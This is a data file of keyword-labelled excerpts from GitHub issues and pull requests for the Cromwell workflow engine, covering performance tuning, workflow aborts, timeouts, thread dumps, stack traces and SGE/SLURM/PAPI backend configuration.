Performance,"~~Might not make much difference until *all* our PRs are rebased to include this throttle~~. Actually this PR is more about allowing the AWS backend to hook into the existing poll retry logic to allow more resilience in the face of ""429 / Too Many Request"" exceptions during status polling.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4817:81,throttle,throttle,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4817,1,['throttle'],['throttle']
Performance,"~~The CGA ""CPU WDL"" validates pretty quickly. With 10,000 requests at a concurrency of 20, the 99% latency is just 249 ms~~. This was actually not doing exactly what I expected: it was failing to parse. At least we know parsing attempts are fast!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458340134:72,concurren,concurrency,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458340134,2,"['concurren', 'latency']","['concurrency', 'latency']"
Performance,"…lity. Notes: ; - As w/ the WDL half of this, I will not be accepting passenger requests for random fixups but only on the actual changes (should be easier here); - sbt assembly is borked, I know that; - currently loading in wdl4s as an unmanaged jar, that'll change prior to merging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/365:214,load,loading,214,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/365,1,['load'],['loading']
Performance,…nking and a wider variety of cacheing strategies,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6676:30,cache,cacheing,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676,1,['cache'],['cacheing']
Performance,"…old performance increase under load prior to DB gumming up. . Things to note:; - Effectively removes Metadata acks & failure notices (see #1811) via no longer emitting the messages but does not fully remove them. They still technically exist, I'll remove them as part of a separate PR; - Completely reworks `CromwellApiServiceSpec` to actually be testing `CromwellApiService` and not a general integration test of our REST endpoints. Two specific tests didn't make the cut (#1828 and #1829) I'll address in separate PRs. There were other tests which did not make the cut but were already effectively being tested in their appropriate units.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1836:5,perform,performance,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1836,2,"['load', 'perform']","['load', 'performance']"
Performance,"👍 . Massive ToL (as in, this just reminded me of something I saw the other day). The akka docs somewhere make the point that for performance reasons one wants to completely handle an exception as close to the call site as possible and then transform into some other object which won't ever do stack unwinding and such. We often do the opposite, passing exceptions all the way back out and then handling them there. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/2091/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2091#issuecomment-289031598:129,perform,performance,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2091#issuecomment-289031598,1,['perform'],['performance']
Performance,"👍 ; Just totally ToL for more optimization later, maybe if instead of having like now a `Map[JobKey, Status]`,; what we really want is more something like a `Map[Status, List[JobKey]]` ?. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1977/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1977#issuecomment-279144686:30,optimiz,optimization,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1977#issuecomment-279144686,1,['optimiz'],['optimization']
Safety,"[31m- should abort a workflow mid run and restart immediately abort.restart_abort_tes *** FAILED *** (1 minute, 52 seconds)[0m; [31m java.lang.Exception: Invalid metadata response:[0m; [31m -Metadata mismatch for calls.scheduled_abort.aborted.executionStatus - expected: ""Failed"" but got: ""Aborted""[0m; [31m at centaur.test.Operations$$anon$13.checkDiff$1(Test.scala:330)[0m",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3571:14,abort,abort,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3571,4,"['Abort', 'abort']","['Aborted', 'abort', 'aborted']"
Safety, (during ExecutingWorkflowState): cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - IOException: Could not read from s3://concr-genomics-results/cromwell-execution/wf_hello/b7e4cdce-ff14-4509-aec3-b226ed31043c/call-hello/hello-rc.txt: s3://s3.amazonaws.com/concr-genomics-results/cromwell-execution/wf_hello/b7e4cdce-ff14-4509-aec3-b226ed31043c/call-hello/hello-rc.txt; Caused by: java.io.IOException: Could not read from s3://concr-genomics-results/cromwell-execution/wf_hello/b7e4cdce-ff14-4509-aec3-b226ed31043c/call-hello/hello-rc.txt: s3://s3.amazonaws.com/concr-genomics-results/cromwell-execution/wf_hello/b7e4cdce-ff14-4509-aec3-b226ed31043c/call-hello/hello-rc.txt; 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:146); 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:145); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at scala.util.Failure.recoverWith(Try.scala:232); 	at cromwell.engine.io.nio.NioFlow.withReader(NioFlow.scala:145); 	at cromwell.engine.io.nio.NioFlow.limitFileContent(NioFlow.scala:154); 	at cromwell.engine.io.nio.NioFlow.$anonfun$readAsString$1(NioFlow.scala:98); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:85); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:336); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:357); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:303); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoin,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341:1633,recover,recoverWith,1633,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341,1,['recover'],['recoverWith']
Safety," (sleeping); at java.lang.Thread.sleep(Native Method); at com.jprofiler.agent.probe.y.run(ejt:1030). ""_jprofiler_native_sampler"" #37 daemon prio=10 os_prio=31 tid=0x00007fb76d269000 nid=0x5d07 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""_jprofiler_native_comm"" #36 daemon prio=5 os_prio=31 tid=0x00007fb770d7d000 nid=0x3707 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""_jprofiler_sampler"" #35 daemon prio=10 os_prio=31 tid=0x00007fb771027000 nid=0x7707 waiting on condition [0x000000012cb95000]; java.lang.Thread.State: TIMED_WAITING (sleeping); at java.lang.Thread.sleep(Native Method); at com.jprofiler.agent.sampler.Sampler.run(ejt:84). ""Attach Listener"" #33 daemon prio=9 os_prio=31 tid=0x00007fb76e3e7800 nid=0x8507 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""db-4"" #31 daemon prio=5 os_prio=31 tid=0x00007fb7706e2000 nid=0x8303 waiting on condition [0x000000012ca92000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-3"" #29 daemon prio=5 os_prio=31 tid=0x00007fb76f4b7000 nid=0x7f03 waiting on condition [0x000000012c88c000]; java.lang",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:36434,Unsafe,Unsafe,36434,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety," *** FAILED *** (3 minutes, 18 seconds); - should fail during execution relative_output_paths_colliding *** FAILED *** (3 minutes, 27 seconds); - should successfully run curl *** FAILED *** (8 minutes, 38 seconds); - should successfully run cwl_cache_within_workflow *** FAILED *** (2 minutes, 49 seconds); - should successfully run cwl_import_type_packed *** FAILED *** (3 minutes, 43 seconds); - should successfully run cwl_interpolated_strings *** FAILED *** (2 minutes, 49 seconds); - should successfully run cwl_relative_imports_url *** FAILED *** (3 minutes, 37 seconds); - should successfully run cwl_relative_imports_zip *** FAILED *** (2 minutes, 52 seconds); - should successfully run docker_hash_dockerhub *** FAILED *** (5 minutes, 18 seconds); - should successfully run docker_hash_gcr *** FAILED *** (5 minutes, 31 seconds); - should successfully run docker_hash_quay *** FAILED *** (4 minutes, 31 seconds); - should successfully run hello *** FAILED *** (2 minutes, 54 seconds); - should successfully run hello_yaml *** FAILED *** (2 minutes, 47 seconds); - should successfully run inline_file *** FAILED *** (3 minutes, 4 seconds); - should successfully run inline_file_custom_entryname *** FAILED *** (3 minutes, 9 seconds); - should successfully run iwdr_input_string *** FAILED *** (3 minutes, 10 seconds); - should successfully run iwdr_input_string_function *** FAILED *** (2 minutes, 59 seconds); - should successfully run non_root_default_user *** FAILED *** (3 minutes, 20 seconds); - should successfully run relative_output_paths *** FAILED *** (2 minutes, 42 seconds); - should successfully run space *** FAILED *** (4 minutes, 18 seconds); - should successfully run standard_output_paths_colliding_prevented *** FAILED *** (3 minutes, 1 second); - should successfully run three_step_cwl *** FAILED *** (5 minutes, 29 seconds); - should NOT call cache the second run of readFromCacheFalse (3 minutes, 21 seconds); - should abort a workflow immediately after submission abort.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:2525,abort,abort,2525,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['abort'],['abort']
Safety," 0; 	}; }. My.conf:. include required(classpath(""application"")). system {; memory-retry-error-keys = [""OutOfMemory"", ""Killed"", ""Error:""]; }. backend {; default = PAPIv2. providers {; PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2beta.PipelinesApiLifecycleActorFactory"". system {; memory-retry-error-keys = [""OutOfMemory"", ""Killed"", ""Error:""]; }; config {; project = ""$my_project""; root = ""$my_bucket""; name-for-call-caching-purposes: PAPI; slow-job-warning-time: 24 hours; genomics-api-queries-per-100-seconds = 1000; maximum-polling-interval = 600. # Setup GCP to give more memory with each retry; system {; memory-retry-error-keys = [""OutOfMemory"", ""Killed"", ""Error:""]; }; system.memory-retry-error-keys = [""OutOfMemory"", ""Killed"", ""Error:""]; memory_retry_multiplier = 4; ; # Number of workers to assign to PAPI requests; request-workers = 3. virtual-private-cloud {; network-label-key = ""network-key""; network-name = ""network-name""; subnetwork-name = ""subnetwork-name""; auth = ""auth""; }; pipeline-timeout = 7 days; genomics {; auth = ""auth""; compute-service-account = ""$my_account""; endpoint-url = ""https://lifesciences.googleapis.com/""; location = ""us-central1""; restrict-metadata-access = false; localization-attempts = 3; parallel-composite-upload-threshold=""150M""; }; filesystems {; gcs {; auth = ""auth""; project = ""$my_project""; caching {; duplication-strategy = ""copy""; }; }; }; system {; memory-retry-error-keys = [""OutOfMemory"", ""Killed"", ""Error:""]; }; runtime {; cpuPlatform: ""Intel Cascade Lake""; }; default-runtime-attributes {; cpu: 1; failOnStderr: false; continueOnReturnCode: 0; memory: ""2048 MB""; bootDiskSizeGb: 10; disks: ""local-disk 375 SSD""; noAddress: true; preemptible: 1; maxRetries: 3; system.memory-retry-error-keys = [""OutOfMemory"", ""Killed"", ""Error:""]; memory_retry_multiplier = 4; zones: [""us-central1-a"", ""us-central1-b""]; }. include ""papi_v2_reference_image_manifest.conf""; }; }; }; }. gustily ls gs://cromwell-executions/MemoryRetryTest/d54a5a39-4d3b",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7451:1952,timeout,timeout,1952,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7451,1,['timeout'],['timeout']
Safety," 2381; 470 pool-10-t 4751; 470 pool-10-t 2381; 282 G1 4751; 282 G1 2381; 188 blaze-tic 4751; 188 blaze-tic 2381; 94 VM 4751; 94 VM 2381; 94 java 4751; 94 java 2381; 94 db-9 4751; 94 db-9 2381; 94 db-8 4751; 94 db-8 2381; 94 db-7 4751; 94 db-7 2381; 94 db-6 4751; 94 db-6 2381; 94 db-5 4751; 94 db-5 2381; 94 db 4751; 94 db-4 4751; 94 db-4 2381; 94 db-3 4751; 94 db-3 2381; 94 db-2 4751; 94 db 2381; 94 db-2 2381; 94 db-20 4751; 94 db-20 2381; 94 db-19 4751; 94 db-19 2381; 94 db-18 4751; 94 db-18 2381; 94 db-17 4751; 94 db-17 2381; 94 db-16 4751; 94 db-16 2381; 94 db-15 4751; 94 db-15 2381; 94 db-1 4751 ...; ```. this is my java command; ```{shell}; java -Xms10M -Xmx125M -Dconfig.file=SGE.conf -jar cromwell-86.jar run xxx.wdl --inputs xxx.json; ```. SGE.conf file:; ```; # Documentation:; # https://cromwell.readthedocs.io/en/stable/backends/SGE. backend {; default = SGE. providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; concurrent-job-limit = 5. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. exit-code-timeout-seconds = 120. runtime-attributes = """"""; Int cpu = 1; Float? memory_gb; String? sge_queue = ""xxx""; String? sge_project = ""xxx""; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l num_proc="" + cpu + "",virtual_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; -binding ${""linear:"" + cpu} \; /usr/bin/env bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; }; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7571:1662,timeout,timeout-seconds,1662,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7571,2,['timeout'],['timeout-seconds']
Safety," = Dispatcher; executor = ""fork-join-executor""; # Using the forkjoin defaults, this can be tuned if we wish; }. # A dispatcher for actors handling API operations; # Keeps the API responsive regardless of the load of workflows being run; api-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; }. # A dispatcher for engine actors; # Because backends behaviour is unpredictable (potentially blocking, slow) the engine runs; # on its own dispatcher to prevent backends from affecting its performance.; engine-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; }. # A dispatcher used by supported backend actors; backend-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; }. # Note that without further configuration, all other actors run on the default dispatcher; }; }. spray.can {; server {; request-timeout = 40s; }; client {; request-timeout = 40s; connecting-timeout = 40s; }; }. system {; // If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; abort-jobs-on-terminate = false. // Max number of retries per job that the engine will attempt in case of a retryable failure received from the backend; max-retries = 10. // If 'true' then when Cromwell starts up, it tries to restart incomplete workflows; workflow-restart = true. // Cromwell will cap the number of running workflows at N; max-concurrent-workflows = 5000. // Cromwell will launch up to N submitted workflows at a time, regardless of how many open workflow slots exist; max-workflow-launch-count = 50. // Number of seconds between workflow launches; new-workflow-poll-rate = 20. // Since the WorkflowLogCopyRouter is initialized in code, this is the number of workers; number-of-workflow-log-copy-workers = 10; }. workflow-options {; // These workflow options will be encrypted when stored in the database; encrypted-fields: []. // AES-256 key to use to encrypt the values in `encrypted-fields`; base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAA",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:84533,abort,abort,84533,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,2,['abort'],"['abort', 'abort-jobs-on-terminate']"
Safety," Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:37:06,029 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(3d36fdc3)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:37:14,145 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(60ec6228)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:23,720 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(a442dc1c)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:37:31,421 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17bed42e)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:40,098 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(e9851ba1)]: Abort received. Aborting 3 EJEAs; `; Cromwell hash: 192ea6025613df967d60e9e975",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:4680,Abort,Aborting,4680,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety," I have created and I want to make a conditional statement. This because according to which sequencing library is made the user wants to trim the cell barcodes or not. So in case the user is providing the metadata with the name of the barcodes in the 4th column the task of trimming the barcode should be ""on"". In contrary, it should be off. This, of course, depends on whether the barcodes are provided in the metadata or not. What I am trying to do is to make the string that is in the barcode with the condition ""?"" (please see the workflow below in the scatter). When the scatter is reading the metadata, in the case in which there is no barcode the WDL is interrupted with this error: . ```; ""message"": ""Failed to evaluate 'scMethTask3.barcode' (reason 1 of 1): Evaluating files_and_metadata_row[3] failed: Failed to find index Success(WomInteger(3)); on array:\n\nSuccess([\""SRR5395068\"", \""SRR5395068_1.fastq.gz\"", \""SRR5395068_2.fastq.gz\""])\n\n3"",; ""causedBy"": []; ```; How can i avoid this? Or is there a way to accomplish what I am trying to do?. ### Which backend are you running? ; Unix terminal within slurm scheduler. ### Example meta_data files:; 1) without barcode; ```; SRR5395067	SRR5395067_1.fastq.gz	SRR5395067_2.fastq.gz	; SRR395068	SRR5395068_1.fastq.gz	SRR5395068_2.fastq.gz	; ```; 2) with barcode; ```; SRR5395067	SRR5395067_1.fastq.gz	SRR5395067_2.fastq.gz ATCGCT	; SRR395068	SRR5395068_1.fastq.gz	SRR5395068_2.fastq.gz ATCGGA; ```; ### Below my workflow:. workflow scMethTask3 {. #information about the monitoring scrip and the number of samples; File? monitoring_script; File meta_data. #information for trimming the cell barcode; File command; Int bases; ; #information for trimming the adapters and low quality reads; Int low_quality_cutoff; Int read_length_cutoff; String adapters_1; String adapters_2; Int trim_start_R1; Int trim_end_R1; Int trim_start_R2; Int trim_end_R2; String TAG. #information memory for each task; Int memory_task1; Int memory_task2. #Start the ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5396:1028,avoid,avoid,1028,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5396,1,['avoid'],['avoid']
Safety," SGE: Sun Grid Engine; # SLURM: workload manager. # Note that these other backend examples will need tweaking and configuration.; # Please open an issue https://www.github.com/broadinstitute/cromwell if you have any questions; slurm {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; # Root directory where Cromwell writes job results in the container. This value; # can be used to specify where the execution folder is mounted in the container.; # it is used for the construction of the docker_cwd string in the submit-docker; # value above.; dockerRoot = ""/cromwell-executions"". concurrent-job-limit = 10; # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; ## Warning: If set, Cromwell will run 'check-alive' for every job at this interval; exit-code-timeout-seconds = 360; filesystems {; local {; localization: [; # soft link does not work for docker with --contain. Hard links won't work; # across file systems; ""copy"", ""hard-link"", ""soft-link""; ]; caching {; duplication-strategy: [""copy"", ""hard-link"", ""soft-link""]; hashing-strategy: ""file""; }; }; }. #; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 3; Int requested_memory_mb_per_core = 8000; Int memory_mb = 40000; String? docker; String? partition; String? account; String? IMAGE; """""". submit = """"""; sbatch \; --wait \; --job-name=${job_name} \; --chdir=${cwd} \; --output=${out} \; --error=${err} \; --time=${runtime_minutes} \; ${""--cpus-per-task="" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --partition=wzhcexclu06 \; --wrap ""/bin/bash ${script}""; """""". submit-docker = """"""; # SINGULARITY_CACHEDIR needs to point to a directory accessible by; # the jobs (i.e. not lscratch). Might want to use a workflow local; # cache dir like in run.sh; source /work/share/ac7m4df1o",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:6904,timeout,timeout-seconds,6904,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['timeout'],['timeout-seconds']
Safety," [UUID(bcfd9d26)]: Docker lookup failed; cala:35); ```. How do I set it up to enable caching calls?. ------------------------------------------------------------------------------------------; running file; ```; java -jar -Ddocker.hash-lookup.method=local -Ddocker.hash-lookup.enabled=true -Dwebservice.port=8088 -Dwebservice.interface=0.0.0.0 -Dconfig.file=/work/share/ac7m4df1o5/bin/cromwell/3_config/cromwellslurmsingularitynew.conf ./cromwell-84.jar server. ```; config ; ```; # This line is required. It pulls in default overrides from the embedded cromwell; # `reference.conf` (in core/src/main/resources) needed for proper performance of cromwell.; include required(classpath(""application"")). # Cromwell HTTP server settings; webservice {; #port = 8000; #interface = 0.0.0.0; #binding-timeout = 5s; #instance.name = ""reference""; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }. # Cromwell ""system"" settings; system {; # If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; #abort-jobs-on-terminate = false. # this tells Cromwell to retry the task with Nx memory when it sees either OutOfMemoryError or Killed in the stderr file.; memory-retry-error-keys = [""OutOfMemory"", ""Out Of Memory"",""Out of memory""]; # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; #graceful-server-shutdown = true. # Cromwell will cap the number of running workflows at N; #max-concurrent-workflows = 5000. # Cromwell will launch up to N submitted workflows at a time, regardless of how many open workflow slots exist; #max-workflow-launch-count = 50. # Number of seconds between workflow launches; #new-workflow-poll-rate = 20. # Since the WorkflowLogCopyRouter is init",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:1351,abort,abort,1351,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,2,['abort'],"['abort', 'abort-jobs-on-terminate']"
Safety," `womtool validate` (and it validated fine on Terra with the automatic validation they do). But the job would run about halfway and then automatically switch to ""Aborting"" status with no explanation or error message. The workflow would eventually fail after a huge delay (about 22 hours), and there would be no real error message. All tasks that ran were successful (but not all tasks ran). # Minimal WDL example. Here is a working example:. ```wdl; version 1.0. workflow my_workflow {; call my_task; }. task my_task {; command {; echo ""hello world""; }; output {; File out = stdout(); }; }; ```. And here is a non-working example that still validates fine using `womtool validate`:. ```wdl; version 1.0. workflow my_workflow {; input {; Boolean run_task; }. if (run_task) {; call my_task; }. output {; File out = select_first([my_task.out, stdout()]); }; }. task my_task {; command {; echo ""hello world""; }; output {; File out = stdout(); }; }; ```. The above gives; ```console; (cromwell) [sfleming@laptop:~/cromwell]$ womtool validate test.wdl ; Success!; ```. # The problem. The problem is that the non-working WDL example above should not validate successfully, as it is NOT a valid WDL. The `stdout()` built-in inside the `select_first()` in the `output` block of the `workflow` is not actually allowed. It will cause a very bizarre error when this WDL is run. # What am I asking for?. 1. Fix `womtool validate` to catch these kinds of errors. Also happens with `stderr()`.; 2. Provide an actionable error message when this kind of edge case ends up being run by Cromwell. Right now it automatically moves to ""Aborting"" status with no error message at all. Very hard to diagnose!. # Other information. I found this error using `miniwdl check`, which correctly identified the error, just FYI. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6976:2275,Abort,Aborting,2275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6976,1,['Abort'],['Aborting']
Safety," about time out operation. It looks that some tasks that take longer does not get a response for the container (although it is still running) and thus cromwell assumes a failure (because docker returns -1 although it is still running) and the workflow finishes with errors. In the logs for the task, embedded into the standard error from the operations, I get the following signature:. ```; time=""2018-03-07T14:17:55+01:00"" level=error msg=""error waiting for container: read tcp 192.168.99.1:56961->192.168.99.101:2376: read: operation timed out""; ```. And the `rc` file is marked with `-1`. I cannot continue on this return code, because the task is still running on the container and continuing assumes that the operation is finished. My local configuration file looks like this:. ```; include required(classpath(""application"")). ## keep always the workflow logs; workflow-options.workflow-log-temporary: false. backend.providers.Local.config {; ## limit the number of jobs; concurrent-job-limit = 10; filesystems.local {; ## do not allow copy (huge files); ## prefer hard-links; localization: [""hard-link"", ""soft-link""]; caching.duplication-strategy: [""hard-link"", ""soft-link""]; }; }; ```. And the cromwell command is (using a `brew` installed wrapper):. ```bash; JAVA_OPTS=""-Dconfig.file=local.conf"" cromwell run --inputs inputs.json --metadata-output metadata-output.json workflow.wdl; ```. This error is happening for different workflows and tasks, so it is very difficult to account for it. In addition, a long-run workflow stops for this and requires a retry of the whole pipeline in my system, so it is really a problem when trying to run a time-consuming workflow that requires re-start for non-real failures. Is there any way that the local backend (or any backend) catch the docker timeout failures and re-attach? Or maybe that the `script.submit` or `script.backgound` checks that the container is really stop and finished before returning a misleading error code?. Thank you in advance!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3370:1985,timeout,timeout,1985,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3370,1,['timeout'],['timeout']
